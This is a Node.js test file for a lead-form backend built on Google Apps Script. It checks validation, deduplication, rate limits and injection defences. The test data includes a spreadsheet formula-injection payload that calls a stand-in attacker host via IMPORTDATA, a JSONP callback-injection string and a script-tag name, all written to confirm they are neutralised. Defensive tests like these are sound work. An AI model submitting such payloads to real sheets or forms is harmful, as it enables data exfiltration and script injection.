import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import vm from 'node:vm';
import { isValidPhone, isValidEmail, isValidName } from '../client/shared/leads.js';

function integration() {
  const properties = new Map();
  const cache = new Map();
  const rows = [];
  const scriptProperties = {
    getProperty: (key) => properties.get(key) || null,
    setProperty: (key, value) => properties.set(key, value),
    deleteProperty: (key) => properties.delete(key),
    getProperties: () => Object.fromEntries(properties),
  };
  const sheet = { getLastRow: () => rows.length, appendRow: (row) => rows.push(row), setFrozenRows() {}, getRange: (row, column) => ({ setFontWeight() {}, setValue(value) { rows[row - 1][column - 1] = value; } }) };
  const context = vm.createContext({
    console,
    ContentService: { MimeType: { JSON: 'json', JAVASCRIPT: 'js' }, createTextOutput: (text) => ({ text, setMimeType() { return this; } }) },
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    PropertiesService: { getScriptProperties: () => scriptProperties },
    CacheService: { getScriptCache: () => ({ put: (key, value) => cache.set(key, value), get: (key) => cache.get(key) || null }) },
    Utilities: { DigestAlgorithm: { SHA_256: 'sha256' }, computeDigest: (_algorithm, value) => [...createHash('sha256').update(value).digest()], newBlob: (value) => ({ getBytes: () => Buffer.from(value) }) },
    SpreadsheetApp: { getActiveSpreadsheet: () => ({ getSheets: () => [sheet] }) },
    MailApp: { sendEmail() { throw new Error('Notification failure'); } },
  });
  vm.runInContext(readFileSync(new URL('../google-apps-script/Code.gs', import.meta.url), 'utf8'), context);
  const post = (value) => JSON.parse(context.doPost({ postData: { contents: JSON.stringify(value) } }).text);
  return { context, rows, properties, cache, post };
}
const lead = { firstName: 'Asha', email: 'asha@example.com', phone: '+91 98765 43210', receipt: 'a'.repeat(32), company: '=IMPORTDATA("https://evil.example")' };

test('Apps Script validates, neutralizes formulas and confirms only a saved row', () => {
  const { context, rows, post } = integration();
  assert.equal(post(lead).ok, true);
  assert.equal(rows.length, 2);
  assert.ok(rows[1][4].startsWith("'="));
  assert.equal(rows[0][9], 'Phone');
  assert.equal(rows[1][9], "'" + lead.phone);
  const receipt = context.doGet({ parameter: { receipt: lead.receipt, callback: 'anvexaReceipt_' + lead.receipt } }).text;
  assert.ok(receipt.includes('"ok":true'));
  assert.equal(receipt.includes(lead.email), false);
});

test('Apps Script retries with the same receipt do not create duplicates', () => {
  const { rows, post } = integration();
  assert.equal(post(lead).ok, true);
  assert.equal(post(lead).ok, true);
  assert.equal(rows.length, 2);
});

test('invalid fields and oversized requests cannot append rows', () => {
  const { rows, post, context } = integration();
  assert.equal(post({ ...lead, email: 'invalid' }).ok, false);
  assert.equal(post({ ...lead, industry: 'invalid' }).ok, false);
  assert.equal(post({ ...lead, phone: '123' }).ok, false);
  assert.equal(post({ ...lead, phone: '' }).ok, false);
  assert.equal(post({ ...lead, phone: undefined }).ok, false);
  assert.equal(post({ ...lead, message: 'a'.repeat(4001) }).ok, false);
  assert.equal(JSON.parse(context.doPost({ postData: { contents: 'a'.repeat(20481) } }).text).ok, false);
  assert.equal(rows.length, 0);
});

test('Apps Script enforces persistent email limits and prevents callback injection', () => {
  const { post, rows, context } = integration();
  for (let i = 0; i < 8; i += 1) assert.equal(post({ ...lead, receipt: (i + 1).toString(16).padStart(32, '0') }).ok, true);
  assert.equal(post({ ...lead, receipt: 'b'.repeat(32) }).ok, false);
  assert.equal(rows.length, 9);
  const output = context.doGet({ parameter: { receipt: lead.receipt, callback: 'alert(1)//' } }).text;
  assert.equal(JSON.parse(output).ok, false);
});

test('email notification failure does not invalidate a saved enquiry', () => {
  const { context, post, rows } = integration();
  context.NOTIFY_EMAIL = 'owner@example.com';
  assert.equal(post(lead).ok, true);
  assert.equal(rows.length, 2);
});

test('invalid requests and honeypots cannot fill durable receipt storage', () => {
  const { post, properties, context } = integration();
  assert.equal(post({ ...lead, email: 'invalid' }).ok, false);
  assert.equal(post({ ...lead, website: 'bot' }).ok, true);
  assert.equal(properties.size, 0);
  const receipt = context.doGet({ parameter: { receipt: lead.receipt, callback: 'anvexaReceipt_' + lead.receipt } }).text;
  assert.ok(receipt.includes('"ok":false'));
});

test('adding phone preserves the columns and rows of an existing Sheet', () => {
  const { post, rows, context } = integration();
  rows.push(Array.from(context.HEADERS).slice(0, 9));
  rows.push(['old date', 'Old name', '', 'old@example.com', 'Company', '', '', 'Old message', 'contacted']);
  assert.equal(post(lead).ok, true);
  assert.equal(rows[0][3], 'Email');
  assert.equal(rows[0][8], 'Status');
  assert.equal(rows[0][9], 'Phone');
  assert.equal(rows[1][8], 'contacted');
  assert.equal(rows[2][9], "'" + lead.phone);
});

test('Apps Script validates phone numbers, emails and names consistently with the application', () => {
  const { context } = integration();
  const cases = [
    ['isValidPhone', isValidPhone, ['9876543210', '+91 98765 43210', '+44 20 7946 0958', '1234567', '0000000000', '+91 09876543210', '+1 (212 555-1234']],
    ['isValidEmail', isValidEmail, ['asha@example.com', 'asha+security@example.co.in', '.asha@example.com', 'asha@example..com', 'asha@-example.com']],
    ['isValidName', isValidName, ['Asha', 'आशा', 'Anne-Marie', '1234', '<script>']],
  ];
  for (const [name, validator, values] of cases) for (const value of values) assert.equal(context[name](value), validator(value), `${name}: ${value}`);
});
